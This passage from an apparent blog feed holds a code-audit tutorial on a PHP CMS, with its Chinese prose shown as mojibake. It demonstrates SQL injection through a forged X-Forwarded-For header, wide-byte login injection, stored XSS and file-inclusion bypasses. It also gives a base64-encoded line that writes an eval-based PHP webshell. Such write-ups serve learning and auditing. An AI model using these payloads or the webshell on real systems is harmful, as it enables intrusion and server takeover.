class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_X_FORWARDED&#x27;</span>)) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$ip</span> = getenv(<span class="string">&#x27;HTTP_X_FORWARDED&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ip</span> = getenv(<span class="string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_FORWARDED&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ip</span> = getenv(<span class="string">&#x27;HTTP_FORWARDED&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$ip</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$ip çš„å€¼ä» HTTP_CLIENT_IPã€HTTP_X_FORWARDED_FOR ç­‰å˜é‡ä¸­è·å¾—ï¼ŒHTTP_CLIENT_IP è¿™ä¸ªç¯å¢ƒå˜é‡æ²¡æœ‰æˆæ ‡å‡†ï¼Œå¾ˆå¤šæœåŠ¡å™¨æ²¡æ³•è·å–ã€‚è€Œç¬¬äºŒä¸ª HTTP_X_FORWARDED_FOR å¯ä»¥é€šè¿‡ HTTP è¯·æ±‚å¤´æ¥ä¿®æ”¹ã€‚</p><p>å…¨å±€æœç´¢getip()è¿™ä¸ªå‡½æ•°</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818160954245.png" alt="image-20210818160954245"></p><p>æŸ¥çœ‹<code>comment.php</code>å‘ç°ï¼Œgetip()è¿”å›å€¼ç›´æ¥æ’å…¥sqlè¯­å¥å¹¶æ‰§è¡Œï¼Œä¸”æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œå­˜åœ¨sqlæ³¨å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO &quot;</span>.table(<span class="string">&#x27;comment&#x27;</span>).<span class="string">&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) </span></span><br><span class="line"><span class="string">VALUES (&#x27;&#x27;, &#x27;<span class="subst">$id</span>&#x27;, &#x27;<span class="subst">$user_id</span>&#x27;, &#x27;<span class="subst">$type</span>&#x27;, &#x27;<span class="subst">$mood</span>&#x27;, &#x27;<span class="subst">$content</span>&#x27;, &#x27;<span class="subst">$timestamp</span>&#x27;, &#x27;&quot;</span>.getip().<span class="string">&quot;&#x27;, &#x27;<span class="subst">$is_check</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="variable">$db</span>-&gt;query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>åœ¨æ–‡ç« è¯„è®ºå¤„å‘ç°contentå­—æ®µçš„å€¼å›æ˜¾ï¼Œå¯åœ¨æäº¤è¯„è®ºæ—¶æŠ“åŒ…ï¼Œæ„é€ X-Forwarded-Forå€¼è¿›è¡Œæ³¨å…¥ã€‚å…ˆè¡¥å……å¥½åŸæœ¬æ’å…¥è¯­å¥ï¼Œå†æ„é€ ç¬¬äºŒæ¬¡æ¶æ„çš„æ’å…¥è¯­å¥ï¼Œæ³¨æ„å•å¼•å·çš„é—­åˆã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 1&#39;,&#39;1&#39; ),(&quot;&quot;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,(database()),&#39;1&#39;,&#39;1</span><br></pre></td></tr></table></figure><p>ç›¸å½“äºæ‰§è¡Œçš„sqlè¯­å¥ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;INSERT INTO &quot;.table(&#39;comment&#39;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) </span><br><span class="line"> VALUES (&#39;&#39;, &#39;$id&#39;, &#39;$user_id&#39;, &#39;$type&#39;, &#39;$mood&#39;, &#39;$content&#39;, &#39;$timestamp&#39;, &#39;1&#39;,&#39;1&#39; ),(&quot;&quot;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,(database()),&#39;1&#39;,&#39;1&#39;, &#39;$is_check&#39;)&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818162716384.png" alt="image-20210818162716384"></p><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818162849575.png" alt="image-20210818162849575"></p><p>å†æŸ¥çœ‹``common.inc.php`, getip()è¿”å›å€¼èµ‹ç»™å˜é‡online_ipï¼Œå…¨å±€æœç´¢è¿™ä¸ªå˜é‡ï¼Œå‘ç°åœ¨/guest_book.phpä¸­ä¹Ÿæ˜¯æœªç»è¿‡æ»¤ç›´æ¥æ’å…¥sqlè¯­å¥å¹¶æ‰§è¡Œã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818165016011.png" alt="image-20210818165016011"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO &quot;</span> . table(<span class="string">&#x27;guest_book&#x27;</span>) . <span class="string">&quot; (id, rid, user_id, add_time, ip, content) </span></span><br><span class="line"><span class="string">VALUES (&#x27;&#x27;, &#x27;<span class="subst">$rid</span>&#x27;, &#x27;<span class="subst">$user_id</span>&#x27;, &#x27;<span class="subst">$timestamp</span>&#x27;, &#x27;<span class="subst">$online_ip</span>&#x27;, &#x27;<span class="subst">$content</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="variable">$db</span>-&gt;query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>æ¥åˆ°ç•™è¨€å¤„è¿›è¡Œæµ‹è¯•ï¼Œå‘è¡¨ç•™è¨€æ—¶å‘ç°æ— è®ºæ˜¯å¦ç•™è¨€éƒ½ä¼šå¼¹å‡ºç•™è¨€å†…å®¹ä¸èƒ½ä¸ºç©ºï¼Œä¿®æ”¹å‰ç«¯ä»£ç æ³¨é‡Šæ‰è¿™ä¸ªå‡½æ•°ï¼Œè·¯å¾„æ˜¯\templates\default\guest_book.htm</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818165537178.png" alt="image-20210818165537178"></p><p>å¯ä»¥æ­£å¸¸ç•™è¨€äº†ï¼Œcontentå­—æ®µæœ‰å›æ˜¾</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818165700506.png" alt="image-20210818165700506"></p><p>æ„é€ XXFå¤´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 1&#39;,database())-- -</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818170842340.png" alt="image-20210818170842340"></p><p>ç•™è¨€å¦‚ä¸‹ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818170933875.png" alt="image-20210818170933875"></p><h3 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h3><p>åœ¨åŒ…å«æ–‡ä»¶<code>common.inc.php</code>ä¸­æ³¨æ„åˆ°æ•°æ®åº“ç¼–ç æ–¹å¼ä¸ºgb2312ï¼Œè¿™å¾ˆå¯èƒ½å¯¼è‡´å®½å­—èŠ‚æ³¨å…¥ã€‚å…¨å±€æœç´¢loginï¼Œåœ¨/admin/login.phpä¸­å‘ç°éªŒè¯ç®¡ç†å‘˜ç™»å½•è´¦å·å¯†ç çš„å‡½æ•°ä¸ºcheck_admin()ã€‚æ‰¾åˆ°check_admin()å®šä¹‰ï¼Œè¿™é‡Œçš„å˜é‡æœ‰å•å¼•å·ä¿æŠ¤ï¼ŒåŠ ä¸Š$_POSTå˜é‡çš„addslashesè½¬ä¹‰ï¼Œåˆšå¥½å¯ä»¥åˆ©ç”¨ %df è®©è½¬ä¹‰çš„åæ–œçº¿å¤±å»ä½œç”¨ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_admin</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$pwd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$db</span>-&gt;getone(<span class="string">&quot;SELECT COUNT(*) AS num FROM &quot;</span>.table(<span class="string">&#x27;admin&#x27;</span>).<span class="string">&quot; WHERE admin_name=&#x27;<span class="subst">$name</span>&#x27; and pwd = md5(&#x27;<span class="subst">$pwd</span>&#x27;)&quot;</span>);</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;num&#x27;</span>] &gt; <span class="number">0</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç™»å½•å¤„æŠ“åŒ…ï¼ˆæ³¨æ„ç›´æ¥åœ¨æµè§ˆå™¨è¾“å…¥ %df ä¼šè¢« urlencodeï¼Œæ‰€ä»¥åº”è¯¥æŠ“åŒ…å‘é€ï¼‰</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818173747096.png" alt="image-20210818173747096"></p><h2 id="å­˜å‚¨å‹XSS"><a href="#å­˜å‚¨å‹XSS" class="headerlink" title="å­˜å‚¨å‹XSS"></a>å­˜å‚¨å‹XSS</h2><p>åœ¨ user.php æ–‡ä»¶ï¼Œç”¨æˆ·å‘å¸ƒæ–°é—»åŠŸèƒ½ï¼Œå‘ç° content æ²¡æœ‰ä½¿ç”¨ htmlspecialchars() å‡½æ•°ï¼Œè€Œæ˜¯ filter_data()ï¼Œè·Ÿè¸ªçœ‹ä¸€ä¸‹ï¼Œåœ¨ /uploads/include/common.fun.php æ‰¾åˆ°å‡½æ•°å®šä¹‰ä»£ç ï¼Œåªè¿‡æ»¤äº† scriptï¼Œiframeï¼Œframeï¼Œmetaï¼Œlink ç­‰ï¼Œè¿™é‡Œå¯ä»¥ç”¨ aï¼Œimg ç­‰æ ‡ç­¾ç»•è¿‡ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818174947999.png" alt="image-20210818174947999"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_data</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$str</span> = preg_replace(<span class="string">&quot;/&lt;(\/?)(script|i?frame|meta|link)(\s*)[^&lt;]*&gt;/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;&quot; onerror&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot;&gt;</span><br></pre></td></tr></table></figure><p>æŠ“åŒ…ä¿®æ”¹å†…å®¹</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818175810565.png" alt="image-20210818175810565"></p><p>è®¿é—®å¯¹åº”æ–°é—»é¡µé¢å‡ºç°å¼¹çª—</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818175902312.png" alt="image-20210818175902312"></p><p>åŒæ ·åœ¨ä¿®æ”¹ä¸ªäººèµ„æ–™åŠŸèƒ½ï¼Œé‚®ç®±å¤„çš„å¡«å†™åªå¯¹æ ¼å¼è¿›è¡Œäº†é™åˆ¶ï¼Œæ²¡æœ‰å…¶ä»–è¿‡æ»¤ï¼ŒxssæˆåŠŸ</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210820143829292.png" alt="image-20210820143829292"></p><h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><p>user.php çš„æ”¯ä»˜åŠŸèƒ½ï¼Œå¯ä»¥é€šè¿‡ $_POST[â€˜payâ€™] æ§åˆ¶æ–‡ä»¶åŒ…å«çš„è·¯å¾„ï¼Œä½†æ˜¯åé¢æ‹¼æ¥äº† /index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="variable">$act</span> == <span class="string">&#x27;pay&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;data/pay.cache.php&#x27;</span>;</span><br><span class="line"><span class="variable">$price</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;price&#x27;</span>];</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pay&#x27;</span>])) &#123;</span><br><span class="line">showmsg(<span class="string">&#x27;å¯¹ä¸èµ·ï¼Œæ‚¨æ²¡æœ‰é€‰æ‹©æ”¯ä»˜æ–¹å¼&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;include/payment/&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;pay&#x27;</span>].<span class="string">&quot;/index.php&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»•è¿‡æ–¹æ³•</p><ul><li><p>%00æˆªæ–­</p><p>æ¡ä»¶ï¼šmagic_quotes_gpc = Offï¼ŒPHPç‰ˆæœ¬&lt;5.3.4</p></li><li><p>è·¯å¾„é•¿åº¦æˆªæ–­</p><p>æ¡ä»¶ï¼šwindows ä¸‹ç›®å½•è·¯å¾„æœ€å¤§é•¿åº¦ä¸º256å­—èŠ‚ï¼Œè¶…å‡ºéƒ¨åˆ†å°†ä¸¢å¼ƒï¼›linux ä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º4096å­—èŠ‚ï¼Œè¶…å‡ºé•¿åº¦å°†ä¸¢å¼ƒï¼›PHPç‰ˆæœ¬&lt;5.2.8</p></li></ul><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210820100418279.png" alt="image-20210820100418279"></p><h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><p>user.phpä¸­çš„ä¸ªäººèµ„æ–™å¤„å¯ä»¥ä¸Šä¼ ä¸ªäººå¤´åƒï¼Œå°è¯•ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œä¸Šä¼ æˆåŠŸï¼Œåˆ¤æ–­è¿™é‡Œæ²¡æœ‰å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œæœ‰æ•ˆè¿‡æ»¤ï¼ŒæŸ¥çœ‹æºç å‘ç°ä»…å¯¹æ–‡ä»¶ç±»å‹è¿›è¡Œäº†è¿‡æ»¤ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä¸Šä¼ å›¾ç‰‡</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">img_upload</span>(<span class="params"><span class="variable">$file</span>, <span class="variable">$dir</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$imgname</span> = <span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="variable">$dir</span> = BLUE_ROOT.DATA.UPLOAD.date(<span class="string">&quot;Ym&quot;</span>).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$dir</span> = BLUE_ROOT.DATA.UPLOAD.<span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span>(!in_array(<span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>],<span class="keyword">$this</span>-&gt;allow_image_type))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font style=&quot;color:red;&quot;&gt;ä¸å…è®¸çš„å›¾ç‰‡ç±»å‹&lt;/font&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$imgname</span>))&#123;</span><br><span class="line">    <span class="variable">$imgname</span> = <span class="keyword">$this</span>-&gt;create_tempname().<span class="string">&#x27;.&#x27;</span>.<span class="keyword">$this</span>-&gt;get_type(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!file_exists(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!mkdir(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font style=&quot;color:red;&quot;&gt;ä¸Šä¼ è¿‡ç¨‹ä¸­åˆ›å»ºç›®å½•å¤±è´¥&lt;/font&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$imgname</span> = <span class="variable">$dir</span> . <span class="variable">$imgname</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;uploading(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$imgname</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(BLUE_ROOT, <span class="string">&#x27;&#x27;</span>, <span class="variable">$imgname</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font style=&quot;color:red;&quot;&gt;ä¸Šä¼ å›¾ç‰‡å¤±è´¥&lt;/font&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶åŒ…å«å›¾ç‰‡é©¬</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210820103913660.png" alt="image-20210820103913660"></p><p>ä½†è¿™æ ·åç»­åˆ©ç”¨ä¸å¤ªæ–¹ä¾¿ï¼Œå¯ä»¥åœ¨å›¾ç‰‡é©¬ä¸­æ’å…¥é‡æ–°å†™å…¥ä¸€ä¸ªé©¬ hack.php çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @fputs(fopen(base64_decode(<span class="string">&#x27;aGFjay5waHA=&#x27;</span>),w),base64_decode(<span class="string">&#x27;PD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKSA/PiA=&#x27;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åŒ…å«åå¯ä»¥çœ‹åˆ°ç›®å½•ä¸‹æˆåŠŸç”Ÿæˆæœ¨é©¬ hack.php</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210820134644761.png" alt="image-20210820134644761"></p><h2 id="ä»»æ„URLè·³è½¬"><a href="#ä»»æ„URLè·³è½¬" class="headerlink" title="ä»»æ„URLè·³è½¬"></a>ä»»æ„URLè·³è½¬</h2><p>åœ¨ç”¨æˆ·ç™»å½•æ—¶æ³¨æ„åˆ°ä¸­é—´æœ‰ä¸€ä¸ªè·³è½¬é¡µé¢</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210820090340618.png" alt="image-20210820090340618"></p><p>å¯¹åº”çš„æºç åœ¨user.phpä¸­ï¼Œæˆªå–äº†ç›¸å…³çš„ä¸¤è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$from</span> = !<span class="keyword">empty</span>(<span class="variable">$from</span>) ? base64_decode(<span class="variable">$from</span>) : <span class="string">&#x27;user.php&#x27;</span>;</span><br><span class="line">showmsg(<span class="string">&#x27;æ¬¢è¿æ‚¨ &#x27;</span>.<span class="variable">$user_name</span>.<span class="string">&#x27; å›æ¥ï¼Œç°åœ¨å°†è½¬åˆ°...&#x27;</span>, <span class="variable">$from</span>);</span><br></pre></td></tr></table></figure><p>$fromå˜é‡å¯ä»¥æ§åˆ¶ä¸‹ä¸€æ­¥è·³è½¬çš„urlï¼Œä¸”æ²¡æœ‰å¯¹æ­¤å‚æ•°çš„è¿‡æ»¤ã€‚</p><p>ç›´æ¥åˆ©ç”¨ï¼šå°† <a href="https://www.baidu.com/">https://www.baidu.com</a> ç¼–ç ä¸º <code>aHR0cHM6Ly93d3cuYmFpZHUuY29t</code> æ”¹åŒ…æ”¾åŒ…åå¯ä»¥çœ‹åˆ°é¡µé¢æˆåŠŸè·³è½¬åˆ°ç™¾åº¦</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210820094557895.png" alt="image-20210820094557895"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210820094912595.png" alt="image-20210820094912595"></p><h2 id="ä»»æ„æ–‡ä»¶åˆ é™¤"><a href="#ä»»æ„æ–‡ä»¶åˆ é™¤" class="headerlink" title="ä»»æ„æ–‡ä»¶åˆ é™¤"></a>ä»»æ„æ–‡ä»¶åˆ é™¤</h2><p>user.php çš„ç¼–è¾‘ä¸ªäººèµ„æ–™åŠŸèƒ½ï¼Œç›´æ¥è°ƒç”¨ unlink å‡½æ•°åˆ é™¤ $_POST[â€˜face_pic3â€™]ï¼Œæ²¡æœ‰è¿›è¡Œç›¸åº”çš„æ£€æŸ¥ï¼Œå­˜åœ¨ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210820135250596.png" alt="image-20210820135250596"></p><p>åˆ©ç”¨ä¸€ä¸‹æ¼æ´ï¼ŒæŠ“åŒ…ä¿®æ”¹ act=edit_user_info ï¼Œpost æ·»åŠ  face_pic3ï¼ŒæˆåŠŸåˆ é™¤åˆšæ‰å†™å…¥çš„æœ¨é©¬ hack.php</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210820135713467.png" alt="image-20210820135713467"></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è¿™ä¸ªcmsé—®é¢˜è¾ƒå¤šå‘ç”Ÿåœ¨ç”¨æˆ·è¾“å…¥å¤„ï¼Œæ²¡æœ‰å¯¹å…¶è¿›è¡Œè¾ƒå¥½çš„è¿‡æ»¤ï¼Œä¸€äº›å˜é‡æ˜æ˜¾æ²¡æœ‰é™åˆ¶åˆ°ä½æˆ–æ— é™åˆ¶ï¼Œä½†å®ƒä½œä¸ºä»£ç å®¡è®¡å…¥é—¨è¿˜æ˜¯å¾ˆå‹å¥½çš„ã€‚ä»¥åè¿˜æ˜¯å¾—å¤šæ€»ç»“ï¼Œå¤šåæ€ï¼Œå…ˆè‡ªå·±å®¡è®¡å®¡è®¡ï¼Œå†çœ‹çœ‹åˆ«çš„å¸ˆå‚…æ€ä¹ˆå®¡è®¡çš„ï¼Œä¸æ–­å€Ÿé‰´ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaååºåˆ—åŒ–</title>
      <link href="posts/36431.html"/>
      <url>posts/36431.html</url>
      
        <content type="html"><![CDATA[<h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><ul><li>åºåˆ—åŒ–ï¼šå°†å¯¹è±¡å†™å…¥åˆ°IOæµä¸­</li><li>ååºåˆ—åŒ–ï¼šä»IOæµä¸­æ¢å¤å¯¹è±¡</li><li>æ„ä¹‰ï¼šåºåˆ—åŒ–æœºåˆ¶å…è®¸å°†å®ç°åºåˆ—åŒ–çš„Javaå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—ï¼Œè¿™äº›å­—èŠ‚åºåˆ—å¯ä»¥ä¿å­˜åœ¨ç£ç›˜ä¸Šï¼Œæˆ–é€šè¿‡ç½‘ç»œä¼ è¾“ï¼Œä»¥è¾¾åˆ°ä»¥åæ¢å¤æˆåŸæ¥çš„å¯¹è±¡ã€‚åºåˆ—åŒ–æœºåˆ¶ä½¿å¾—å¯¹è±¡å¯ä»¥è„±ç¦»ç¨‹åºçš„è¿è¡Œè€Œç‹¬ç«‹å­˜åœ¨ã€‚</li><li>ä½¿ç”¨åœºæ™¯ï¼šæ‰€æœ‰å¯åœ¨ç½‘ç»œä¸Šä¼ è¾“çš„å¯¹è±¡éƒ½å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œæ¯”å¦‚RMIï¼ˆremote method invoke,å³è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼‰ï¼Œä¼ å…¥çš„å‚æ•°æˆ–è¿”å›çš„å¯¹è±¡éƒ½æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œå¦åˆ™ä¼šå‡ºé”™ï¼›æ‰€æœ‰éœ€è¦ä¿å­˜åˆ°ç£ç›˜çš„javaå¯¹è±¡éƒ½å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ã€‚é€šå¸¸å»ºè®®ï¼šç¨‹åºåˆ›å»ºçš„æ¯ä¸ªJavaBeanç±»éƒ½å®ç°Serializeableæ¥å£ã€‚</li></ul><h1 id="å®ç°æ–¹å¼"><a href="#å®ç°æ–¹å¼" class="headerlink" title="å®ç°æ–¹å¼"></a>å®ç°æ–¹å¼</h1><h2 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" 